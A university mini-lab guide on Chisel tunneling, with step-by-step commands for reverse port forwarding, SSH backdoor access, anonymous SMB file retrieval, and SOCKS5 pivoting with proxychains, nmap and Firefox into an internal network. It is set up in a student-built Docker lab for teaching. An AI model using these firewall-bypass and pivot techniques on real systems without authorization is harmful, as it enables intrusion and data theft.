# IT 359 Chisel Mini-Lab
In this lab, you will be learning about the Chisel tool and executing different exercises in scenarios where Chisel tunneling can be used. The objectives of this lab include: 
- [Understanding how Chisel Works](#introduction-to-chisel)
- [Understanding Local Port Forwarding](#local-port-forwarding)
- [Understanding Remote Port Forwarding](#remote-port-forwarding--exercises)
    - [Accessing Apache Server](#1-bypassing-firewall-restrictions-to-access-apache-server)
    - [SSH Tunneling](#2-ssh-tunneling-and-remote-access)
    - [SMB Share Directory](#3-smb-share-discovery)
- [Understanding & Demonstrating Dynamic Port Forwarding](#dynamic-port-forwarding--exercises)
    - [Proxychains](#proxychains-setup)
    - [CLI-based HTTP Access Pivot](#1-cli-based-http-access-pivot)
    - [Port/Service Discovery Using `nmap`](#2-portservice-discovery-with-nmap)
    - [GUI Pivot Using Firefox](#3-gui-pivot-using-firefox-web-browser)

> A full walkthrough video is available here:
> https://youtu.be/9sgqewiB1bo

## Important Notes
Before diving into the mini-lab, there will be a few things to note while learning how to use Chisel. This mini-lab is specifically built around [`SETUP.md`](SETUP.md) and terminology used here will be different from that of other sources. The terms "target" and "attacker" will be used in the syntax and context related to the setup of this lab and Chisel syntax may be altered for clarity. For example: 
- **Attackers** and **Targets** may be a Client or Server depending on the situation. 
- Chisel syntax of `<server-ip>` may look like `<attacker-ip>` or `<ubuntu_target-ip>` in this lab.
- `chisel` is being used instead of `./chisel` for a cleaner look.
- **Attacker** is used to describe an external machine part of a public or external network.
- **Target** is used to describe an internal machine part of a private or internal network.
- **Kali machine** or **Kali root-user terminal** is used to describe the Attacker.
- **ubuntu_target** or **metasploitable** is used to describe the Target.

Please refer to the network diagram and IP table in [`SETUP.md`](SETUP.md) before reading on and executing the given exercises. Note that some of the commands used in this mini-lab are specific to [`SETUP.md`](SETUP.md).

*✦ Screenshots are included as placeholder markers for student submissions. This repo does not contain screenshots since the exercises are shown in the video above. ✦*

## Introduction to Chisel
The Chisel tool provides us with a fast TCP/UDP tunnel, which is transported over HTTP and optionally secured with encryption and authentication. While Chisel does not use the SSH protocol, it is functionally similar to SSH tunneling in that it provides secure and flexible port forwarding over restricted networks, but, through the use of its own tunnels over HTTP. 

Both SSH and Chisel support the following types of port forwarding:
- Local Port Forwarding
- Remote Port Forwarding
- Dynamic Port Forwarding

In this lab, we will briefly cover each type of forwarding and demonstrate real-world use cases of remote and dynamic port forwarding using Chisel. 

## Local Port Forwarding
In Chisel, local port forwarding is a technique where the attacker, or Chisel client, opens a local port from their own machine. This redirects traffic through a tunnel to a specified port on a service (e.g., a webserver) running on the target, or Chisel server. 

In our scenario (see [`SETUP.md`](SETUP.md)), we have an internal network that allows all outbound traffic but blocks all inbound traffic. In this case, local port forwarding would **not** work using Chisel since local port forwarding needs to allow the inbound traffic from the external machine through to the internal machine in order to establish a connection and bind to the port.

```bash
# Starting Chisel Server from Target
chisel server -p 8080

# Starting Chisel Client from Attacker
chisel client http://<server-ip>:8080 8000:localhost:80
```
Syntax Breakdown for Local Port Forwarding:
- `chisel` calls the Chisel binary
- `server` runs Chisel in Server mode
- `client` runs Chisel in Client mode
- `http://<server-ip>:8080` connects the Chisel Client to the machine running the Chisel server using HTTP on port `8080`
- `8000:localhost:80`
    - `8000` opens a port on the Chisel client's local machine. 
    - `localhost:80` forwards traffic to port `80` on Chisel server's `localhost` where the service is running

In this case, the Target runs the Chisel server on port `8080` and the Attacker runs the Chisel client. The attacker opens port `8000` on its local machine, forwarding traffic through the tunnel to the Target's `localhost:80`, which is a service like an internal web server (like Apache).

> Remember, we expect this to *fail* in our lab setup.

### Attempt to use Local Port Forwarding with `curl`
**Target** | From **ubuntu_target**, run this command: 
```bash
chisel server -p 8080
```

**Attacker** | Open a **Kali root-user terminal** and issue this: 
```bash
chisel client http://<ubuntu_target-ip>:8080 8000:localhost:80
```

**Attacker** | On a different **Kali root-user terminal**:
```bash
curl http://localhost:8000
```

> ✦ SS1: Show `curl` failing from the Attacker's machine: [insert screenshot]


## Remote Port Forwarding & Exercises
In Chisel, remote port forwarding is a technique where the target, or Chisel client, creates a tunnel that allows the attacker, or Chisel server, to open a port on their own machine. Traffic sent to this port on the attacker is forwarded through the tunnel to a service running on the target machine. The client/server is done in reverse of that in local port forwarding.

```bash
# Starting Chisel Server from Attacker
chisel server -p 8080 --reverse 

# Starting Chisel Client from Target
chisel client http://<server-ip>:8080 R:8000:localhost:80 
```

Syntax Breakdown for Remote Port Forwarding:
- `--reverse` enables the server to allow remote clients to bind ports on the server. 
- `http://<server-ip>:8080` tells the client to connect outbound to the Chisel server over HTTP on port 8080
- `R:8000:localhost:80`
    - `R:` tells the client to set up a reverse tunnel
    - `8000` port open on the server
    - `localhost:80` the client's local service, like an internal webserver (e.g., Apache), that the server will be tunneled to

Remote port forwarding will be successful because the target initiates the connection to the tunnel outward to the attacker in our setup. We will go over three examples to gain a better understanding of using remote port forwarding in Chisel. 

### 1. Bypassing Firewall Restrictions to Access Apache Server
*Scenario: An external machine wants to gain access to a web server running on an internal machine. We will be using Chisel to tunnel HTTP traffic from a firewalled host.*

**Attacker** | Start the Chisel Server on a **Kali root-user terminal**: 
```bash
chisel server -p 8080 --reverse 
```
**Target** | Start the Chisel Client on a **ubuntu_target** terminal: 
```bash
chisel client -v http://<attacker-ip>:8080 R:8081:localhost:80 
```

**Attacker** | Open a new terminal as a **Kali** root-user and issue this command: 
```bash
curl http://localhost:8081 
```

The attacker successfully gains access to **ubuntu_target's** Apache server running on `localhost:80`, even behind firewall restrictions. 

> ✦ SS2: Show that Kali has successfully used Chisel to access the `apache2` server on **ubuntu_target**: [insert screenshot]

To stop the Chisel Client on **ubuntu_target** or the Chisel Server on **Kali**, use `Ctrl + C`.

### 2. SSH Tunneling and Remote Access
*Scenario: An attacker wants to expose the target's internal SSH service to their own machine using reverse port forwarding since direct access is blocked by a firewall.*

**Attacker** | Start the Chisel Server on Kali root-user terminal:
```bash
chisel server -p 8080 --reverse 
```

Before we start the Chisel Client on **ubuntu_target**, we will need to make sure we can log into the **ubuntu_target** user from the **Kali machine** using `ssh`. We can connect to a remote system using `ssh` with a username and password. Our containers are set up so that we access them as the root user and all we need to do is set a password (e.g., "chisel") since `Docker` containers do not have `ssh` passwords set, especially for the root user. 

**Target** | To set a password, make sure you are inside of **ubuntu_target** and run: 
```bash
passwd root
```

**Target** | After setting the password, run the Chisel Client on **ubuntu_target**:
```bash
chisel client -v http://<attacker-ip>:8080 R:2222:localhost:22 
```

**Attacker** | In a **Kali root-user terminal**, try to connect to the **ubuntu_target** user by running: 
```bash
ssh root@localhost -p 2222 
```

> ✦ SS3: Show the successful login to the user on **ubuntu_target** using `ssh` from **Kali**: [insert screenshot]

We can use this to our advantage. `ssh` allows a reliable connection inside the target machine. Now that we are inside the internal network, we can enumerate the internal network. We can learn what networks **ubuntu_target** is connected to or find other subnets and gateways you could not previously see as the attacker, or **Kali machine**. This creates a reliable backdoor for ongoing access.

> ✦ SS4: Try using `ip a` within `ssh`: [insert screenshot]

We can also use `nmap` to find other live hosts and look for internal web servers, databases, printers, and other devices that Kali would never be able to see without this tunnel. Install `nmap` and then issue a command with it: 

```bash
apt update && apt install nmap -y 

nmap -sP <internal-net>/24 
```
> ✦ SS5: Show the `nmap` scan results: [insert screenshot]


### 3. SMB Share Discovery
*Scenario: An attacker wants to identify shared folders on an internal machine that is running an SMB server. Direct access to the internal network is blocked by a firewall so the attacker uses reverse port forwarding to expose the internal SMB port to their own external machine and then retrieves one of the files.*

The Server Message Block (SMB) protocol is a client-server communication protocol used primarily for sharing access to files, printers, and other network resources, originally designed for Windows systems but is now supported on Linux using `Samba`. SMB currently relies on ports `445` and `139`. Attackers may use this to their advantage in hacking and post-exploitation to access shared files, check for misconfigured permissions, exfiltrate data, or find and harvest credentials or other data. 

**Target** | On **ubuntu_target**, install and configure `samba`
```bash
apt update

apt install samba -y
```

**Target** | Create a shared folder:
```bash
mkdir -p /srv/public

chmod 777 /srv/public

echo "This is a secret file" > /srv/public/readme.txt
```
**Target** | Add the share to `/etc/samba/smb.conf`:
```ini
[public]
path = /srv/public
public = yes
writable = yes
guest ok = yes
```

**Target** | `ubuntu_target` needs to host the SMB share on `localhost:445`. To do this, manually start `samba` as a background process and confirm it is running: 
```bash
smbd -D

ps aux | grep smbd
```

**Attacker** | On **Kali root-user terminal**, start the Chisel server: 
```bash
chisel server -p 8080 --reverse
```

**Target** | On **ubuntu_target**, start the Chisel Client to expose SMB (`localhost:445`):
```bash
chisel client -v http://<attacker-ip>:8080 R:445:localhost:445
```

**Attacker** | On a **Kali root-user terminal**, use `smbclient` to scan **ubuntu_target** for accessible shares: 
```bash
smbclient -L //localhost/public -N
```
- `-L` tells `smbclient` to list available shares. The `//localhost` specifies the internal SMB server.

**Attacker** | Connect to the share:
```bash
smbclient //localhost/public -N
```
- `public -N` means we are going to connect anonymously 

The `-N` flag connects anonymously to the `public` share on **ubuntu_target**. This means that it is not necessary to provide a username or password.

**Attacker** | You should see `smb: \>`, then we can type: 
```bash
ls # show files

get readme.txt # download readme.txt
```
- Using `ls` shows us files from the internal share of **ubuntu_target** while we are on the attacker machine. 

SMB shares may contain credentials, scripts, backup files, logs, etc. This is especially important because networks will often allow anonymous access to these SMB shares. Being able to reach them through our Chisel tunnel means not only have we successfully bypassed the firewall restrictions, but we are also performing real post-exploitation enumeration. 

**Attacker** | Exit the SMB session: 
```bash
exit
```
**Attacker** | Verify the file's contents: 
```bash
cat readme.txt
```

This demonstration showcases Chisel's ability to tunnel over non-HTTP services like SMB (port `445`), which is commonly used to discover hidden files on a shared folder between internal systems. SMB share discovery can be a foundational step towards data discovery, lateral movement, and recon.

> ✦ SS6: Show that the attacker (Kali machine) has successfully downloaded an internal file from the `public` SMB share on **ubuntu_target**: [insert screenshot]


## Dynamic Port Forwarding & Exercises
In Chisel, dynamic port forwarding is a technique that uses a SOCKS5 proxy on the attacker's machine, or Chisel server, that allows traffic from various applications to be tunneled through the internal target machine, or Chisel client. Just like SSH, Chisel's built-in SOCKS5 support allows us to create a SOCKS5 proxy that tunnels all traffic through the compromised machine. This is like using the compromised internal machine as a dynamic gateway to the rest of the internal network. This is perfect for attackers to explore unknown networks by scanning, browsing, and exploiting any other internal host using tools like proxychains.

You will see new flags while using dynamic port forwarding with Chisel:
- `R:` is remote bind on the server
- `1080:` is the port you want on the attacker
- `socks` is the special Chisel keyword for proxying

Note that dynamic port forwarding via SOCKS5 only works with remote port forwarding. 

### Proxychains Setup
`proxychains` is a Linux tool that forces any program to connect to the internet through a proxy, like SOCKS5 or HTTP. It will take your normal tool, like `nmap`, force it to send traffic through the Chisel SOCKS5 proxy (`127.0.0.1:1080`), and that traffic is tunneled through the compromised internal machine (target) into the internal network. 

**Attacker** | On a **Kali root-user terminal**, start the server in reverse mode:
```bash
chisel server -p 8080 --reverse 
```

**Target** | On **ubuntu_target**, bind SOCKS5 proxy remotely using this:
```bash
chisel client -v http://<attacker-ip>:8080 R:1080:socks 
```

**Attacker** | Configure `proxychains` on the **Kali machine**: 
```bash
sudo nano /etc/proxychains.conf 
```

**Attacker** | Paste this into the configuration file:
```bash
# proxychains.conf 

strict_chain 
proxy_dns  
tcp_read_time_out 15000 
tcp_connect_time_out 8000 

[ProxyList] 
socks5 127.0.0.1 1080 
```
Save and exit by pressing `Ctrl + o`, `Enter`, and then `Ctrl + x`.


### 1. CLI-based HTTP Access Pivot
*Scenario: An external machine has successfully tunneled into the internal network using a SOCKS5 proxy over Chisel. They want to verify access to an internal web application running on **metasploitable** by retrieving a custom page from its Apache server using `curl`.*

Inside of **metasploitable**, `apache2` is already installed so there is no need to install it this time. We need to start the `apache2` service and we are going to create our own custom page on `apache2` so that we can see that we successfully pivoted. 

**Target** | On **metasploitable**: 
```bash
service apache2 start 

echo "Pivot worked! Apache says hello." > /var/www/html/pivot.html 

service apache2 status # Check if it is running 
```

**Attacker** | On the **Kali machine**:
```bash
proxychains curl http://<metasploitable-ip>/pivot.html 
```
Traffic goes through the SOCKS5 proxy on the **attacker (Kali machine)**, which tunnels this request through **ubuntu_target**, and reaches **metasploitable's** internal Apache server. 

> SS7: On the **attacker (Kali machine)** terminal, show the pivot.html output from **metasploitable**: [insert screenshot]

### 2. Port/Service Discovery with `nmap`
*Scenario: An external machine has tunneled into an internal network and wants to enumerate available services on `metasploitable` using `nmap`. They will perform a scan through `proxychains`.*

Since we are running **metasploitable** in a container, most ports are closed but port 80 should be open. 

**Attacker** | Try pivoting to your internal LAN from a **Kali root-user terminal**: 
```bash
proxychains nmap -sT -Pn <metasploitable-ip> 
```

> ✦ SS8: On the **attacker (Kali machine) terminal**, show the open port using `nmap` on **metasploitable**: [insert screenshot]


### 3. GUI Pivot using Firefox Web Browser
*Scenario: An external machine has gained access to the internal network using `proxychains` and a SOCKS5 proxy through Chisel's remote port forwarding function and wants to browse an internal web application hosted on **metasploitable** by opening Firefox locally and tunneling traffic through the SOCKS5 proxy.*

**Attacker** | If you want to browse an internal web app:
```bash
proxychains firefox http://<metasploitable-ip> 
```
This lets you log into the app, view the source, interact with php forms, and provide visual pivoting. 

> ✦ SS9: On an attacker (Kali) terminal, show the pivoted website in Firefox on Kali: [insert screenshot]

## Discussion Questions
1. What is Chisel? How does it work?

2. What is the difference between local port forwarding and remote port forwarding? Why does remote port forwarding work in our lab but not local port forwarding?

3. What is dynamic port forwarding? Does it have syntax more similar to remote or local port forwarding?

4. Why is SOCKS5 important for dynamic port forwarding? How does it allow attacker to dig deeper into the internal network?

5. What advantages does an attacker gain through the successful use of Chisel?


## Known Issues
If you lose internet at any point from both Kali and inside the containers, check `ip a` as the Kali root user. If Kali does not have an IP address at interface `eth0`, bring it back up and reassign: 
```bash
sudo ip link set eth0 up 

sudo dhclient eth0 
```

## References
- https://builtin.com/software-engineering-perspectives/ssh-port-forwarding#:~:text=Remote%20port%20forwarding%2C%20also%20known,running%20on%20a%20remote%20server. 

- https://github.com/jpillora/chisel/blob/master/README.md#usage

- https://jieliau.medium.com/chisel-tool-for-your-lateral-movement-dd3fb398c696

- https://www.techtarget.com/searchnetworking/definition/Server-Message-Block-Protocol#:~:text=The%20Server%20Message%20Block%20(SMB)%20protocol%20is%20a%20client%2D,SMB%20protocol%20in%20the%201980s. 

- https://github.com/haad/proxychains 